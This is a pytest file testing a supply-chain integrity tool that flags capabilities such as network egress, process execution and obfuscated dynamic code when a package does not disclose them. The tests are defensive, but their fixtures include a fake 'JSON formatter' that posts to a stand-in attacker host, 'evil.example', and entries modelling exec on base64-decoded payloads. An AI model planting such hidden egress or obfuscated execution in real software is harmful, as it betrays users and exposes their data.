# CUI // SP-CTI
"""Tests for the SIPA intent reconciler — Mode B (sipa-intent-02).

Covers the acceptance criteria for ``tools/integrity/intent_reconciler.py``:

  * ``reconcile_blind(manifest, claim)`` -> ``integrity_findings``-shaped dicts.
  * **Undisclosed pass:** every capability in the exercised manifest that the
    parsed claim does not imply becomes an ``undisclosed_capability`` finding,
    severity derived from ``constants.RISK_WEIGHTS_CAPABILITY`` (network_egress ->
    high, process_exec / dynamic_code -> critical).
  * **The task's anchor case:** a "JSON formatter" whose manifest has
    ``network_egress`` yields ``undisclosed_capability(network_egress, high)``.
  * **Intrinsic-risk pass:** ``dynamic_code`` + ``obfuscation`` together is
    ``critical`` regardless of what the claim discloses.
  * A claim that covers the exercised behavior yields no undisclosed finding.

Pure-Python; no DB / network / subprocess (the persistence path is exercised
separately against an in-memory SQLite connection).
"""
import pytest

from tools.integrity import constants
from tools.integrity import intent_reconciler as ir


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _cap(cap_type, file_path="mod.py", line=1, **evidence):
    """Build a capability record like capability_extractor.extract emits."""
    return {
        "file_path": file_path,
        "function_name": None,
        "capability_type": cap_type,
        "evidence": dict(evidence),
        "line_start": line,
        "line_end": line,
        "risk_weight": constants.RISK_WEIGHTS_CAPABILITY.get(cap_type, 0.0),
    }


def _by_type(findings, finding_type):
    return [f for f in findings if f["finding_type"] == finding_type]


# --------------------------------------------------------------------------- #
# Anchor case — a "JSON formatter" whose manifest has network_egress
# --------------------------------------------------------------------------- #
def test_json_formatter_with_network_egress_is_undisclosed_high():
    manifest = [_cap("network_egress", api="requests.post", url="https://evil.example")]
    # README claims only JSON formatting -> no network claim.
    claim = {"claimed_capabilities": set()}

    findings = ir.reconcile_blind(manifest, claim)
    undisclosed = _by_type(findings, "undisclosed_capability")

    assert len(undisclosed) == 1
    f = undisclosed[0]
    assert f["detail"]["capability_type"] == "network_egress"
    assert f["severity"] == "high"
    assert f["source_scanner"] == ir.SOURCE_SCANNER
    assert f["finding_type"] in constants.FINDING_TYPES
    assert f["severity"] in constants.SEVERITY


# --------------------------------------------------------------------------- #
# Severity derivation from RISK_WEIGHTS
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "cap_type, expected",
    [
        ("dynamic_code", "critical"),   # weight 1.00
        ("process_exec", "critical"),   # weight 0.95
        ("network_egress", "high"),     # weight 0.90
        ("env_secret", "high"),         # weight 0.85
        ("serialization", "high"),      # weight 0.80
        ("filesystem", "medium"),       # weight 0.70
        ("crypto", "low"),              # weight 0.40
    ],
)
def test_undisclosed_severity_tracks_risk_weight(cap_type, expected):
    findings = ir.reconcile_blind([_cap(cap_type)], claim=set())
    undisclosed = _by_type(findings, "undisclosed_capability")
    assert undisclosed and undisclosed[0]["severity"] == expected


# --------------------------------------------------------------------------- #
# A claim that covers the behavior -> no undisclosed finding
# --------------------------------------------------------------------------- #
def test_claimed_capability_is_not_flagged():
    manifest = [_cap("network_egress")]
    claim = {"claimed_capabilities": {"network_egress"}}
    findings = ir.reconcile_blind(manifest, claim)
    assert _by_type(findings, "undisclosed_capability") == []


def test_partial_claim_flags_only_the_gap():
    manifest = [_cap("network_egress"), _cap("process_exec"), _cap("filesystem")]
    claim = {"claimed_capabilities": {"network_egress"}}
    findings = ir.reconcile_blind(manifest, claim)
    flagged = {f["detail"]["capability_type"] for f in _by_type(findings, "undisclosed_capability")}
    assert flagged == {"process_exec", "filesystem"}


# --------------------------------------------------------------------------- #
# Grouping — multiple sites of one capability in a file collapse to one finding
# --------------------------------------------------------------------------- #
def test_multiple_sites_collapse_per_file_capability():
    manifest = [
        _cap("network_egress", file_path="a.py", line=10),
        _cap("network_egress", file_path="a.py", line=20),
        _cap("network_egress", file_path="b.py", line=5),
    ]
    findings = _by_type(ir.reconcile_blind(manifest, set()), "undisclosed_capability")
    # One finding per (file, capability): a.py + b.py.
    assert len(findings) == 2
    a = next(f for f in findings if f["file_path"] == "a.py")
    assert a["detail"]["occurrences"] == 2
    assert a["line"] == 10  # anchored at the earliest site


# --------------------------------------------------------------------------- #
# Intrinsic-risk pass — dynamic_code + obfuscation => critical, regardless of claim
# --------------------------------------------------------------------------- #
def test_dynamic_code_plus_obfuscation_is_intrinsic_critical():
    manifest = [
        _cap("dynamic_code", file_path="x.py", line=3, api="exec"),
        _cap("obfuscation", file_path="x.py", line=2, api="base64.b64decode"),
    ]
    # Even if BOTH are disclosed, the combination is still flagged.
    claim = {"claimed_capabilities": {"dynamic_code", "obfuscation"}}
    findings = ir.reconcile_blind(manifest, claim)

    intrinsic = _by_type(findings, "dangerous_api")
    assert len(intrinsic) == 1
    f = intrinsic[0]
    assert f["severity"] == "critical"
    assert f["detail"]["rule"] == "dynamic_code+obfuscation"
    assert f["file_path"] == "x.py"


def test_obfuscated_input_taint_alone_is_intrinsic_critical():
    # exec(payload) where payload = b64decode(...) -> extractor sets obfuscated_input.
    manifest = [_cap("dynamic_code", file_path="x.py", line=9, api="exec", obfuscated_input=True)]
    findings = ir.reconcile_blind(manifest, claim=set())
    intrinsic = _by_type(findings, "dangerous_api")
    assert len(intrinsic) == 1
    assert intrinsic[0]["severity"] == "critical"
    assert "dynamic_code(obfuscated_input)" in intrinsic[0]["detail"]["signals"]


def test_dynamic_code_without_obfuscation_no_intrinsic_finding():
    manifest = [_cap("dynamic_code", file_path="x.py")]
    findings = ir.reconcile_blind(manifest, claim={"claimed_capabilities": {"dynamic_code"}})
    # Disclosed dynamic_code on its own -> no undisclosed, no intrinsic.
    assert _by_type(findings, "dangerous_api") == []
    assert _by_type(findings, "undisclosed_capability") == []


def test_intrinsic_fires_per_file_once():
    manifest = [
        _cap("dynamic_code", file_path="x.py", line=3),
        _cap("obfuscation", file_path="x.py", line=2),
        _cap("dynamic_code", file_path="x.py", line=7),
    ]
    intrinsic = _by_type(ir.reconcile_blind(manifest, set()), "dangerous_api")
    assert len(intrinsic) == 1


# --------------------------------------------------------------------------- #
# Input normalization — bare string sets and parse_claim dicts both work
# --------------------------------------------------------------------------- #
def test_manifest_accepts_bare_capability_strings():
    findings = ir.reconcile_blind(["network_egress", "process_exec"], claim=set())
    flagged = {f["detail"]["capability_type"] for f in _by_type(findings, "undisclosed_capability")}
    assert flagged == {"network_egress", "process_exec"}


def test_claim_accepts_set_or_parse_claim_dict():
    manifest = [_cap("network_egress")]
    assert ir.reconcile_blind(manifest, {"network_egress"}) == []  # set form covers it
    assert ir.reconcile_blind(manifest, {"claimed_capabilities": {"network_egress"}}) == []


def test_none_claim_treats_everything_as_undisclosed():
    manifest = [_cap("filesystem")]
    findings = _by_type(ir.reconcile_blind(manifest, None), "undisclosed_capability")
    assert len(findings) == 1


# --------------------------------------------------------------------------- #
# assess_blind end-to-end over a real file tree (no persistence)
# --------------------------------------------------------------------------- #
def test_assess_blind_end_to_end_flags_undisclosed_network(tmp_path):
    (tmp_path / "README.md").write_text("# jsonfmt\n\nFormats JSON files.\n", encoding="utf-8")
    (tmp_path / "tool.py").write_text(
        '"""Formats JSON."""\n'
        "import requests\n\n"
        "def go():\n"
        "    requests.post('https://evil.example', json={})\n",
        encoding="utf-8",
    )
    result = ir.assess_blind(str(tmp_path))

    assert "network_egress" in result["exercised_capabilities"]
    assert "network_egress" not in result["claimed_capabilities"]
    undisclosed = _by_type(result["findings"], "undisclosed_capability")
    assert any(
        f["detail"]["capability_type"] == "network_egress" and f["severity"] == "high"
        for f in undisclosed
    )


# --------------------------------------------------------------------------- #
# Persistence — append-only to integrity_findings (in-memory SQLite)
# --------------------------------------------------------------------------- #
def test_reconcile_and_persist_writes_findings(tmp_path, monkeypatch):
    import sqlite3

    from tools.integrity.db import init_db as init_db_mod

    conn = sqlite3.connect(":memory:")
    init_db_mod.init_db(conn)

    # Seed a parent assessment row so the FK (if enforced) is satisfied.
    try:
        conn.execute(
            "INSERT INTO integrity_assessments "
            "(id, source, source_type, assess_mode, status, tenant_id, classification) "
            "VALUES (1, ?, 'local', 'provenance_blind', 'quarantine', NULL, NULL)",
            (str(tmp_path),),
        )
        conn.commit()
    except sqlite3.OperationalError:
        pass  # schema variant without these columns — the findings INSERT is what we test

    manifest = [_cap("network_egress"), _cap("process_exec")]
    result = ir.reconcile_and_persist(1, manifest, claim=set(), conn=conn)

    assert result["findings_persisted"] == 2
    rows = conn.execute(
        "SELECT source_scanner, finding_type, severity FROM integrity_findings "
        "WHERE assessment_id = 1 ORDER BY id"
    ).fetchall()
    assert len(rows) == 2
    assert all(r[0] == "reconciliation" and r[1] == "undisclosed_capability" for r in rows)
    conn.close()


# --------------------------------------------------------------------------- #
# Output shape is exactly the scanner-adapter integrity_findings shape
# --------------------------------------------------------------------------- #
def test_finding_shape_matches_integrity_findings_contract():
    findings = ir.reconcile_blind([_cap("network_egress")], set())
    for f in findings:
        assert set(f) == {"source_scanner", "finding_type", "severity", "file_path", "line", "detail"}
        assert f["finding_type"] in constants.FINDING_TYPES
        assert f["source_scanner"] in constants.FINDING_SCANNERS
        assert f["severity"] in constants.SEVERITY
        assert isinstance(f["detail"], dict)
